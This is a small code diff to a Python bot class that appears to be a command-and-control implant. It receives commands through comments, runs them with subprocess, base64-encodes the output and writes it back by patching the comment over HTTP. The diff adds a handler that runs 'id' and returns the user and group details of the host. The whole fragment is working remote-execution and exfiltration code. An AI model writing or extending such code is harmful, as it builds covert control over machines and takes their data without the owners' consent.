@@ -49,6 +49,9 @@ class Bot:
                         data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
                     elif command == cmd.COMMAND_PING["command"]:
                         data = u.encode_data_to_markdown(u.encode_data_to_base64("Pong".encode(encoding="UTF-8")))
+                    elif command == cmd.COMMAND_ID["command"]:
+                        result = subprocess.run(["id"], stdout=subprocess.PIPE)
+                        data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
 
                     data = {"body": comment["body"] + "\n" + data}
                     res = requests.patch(
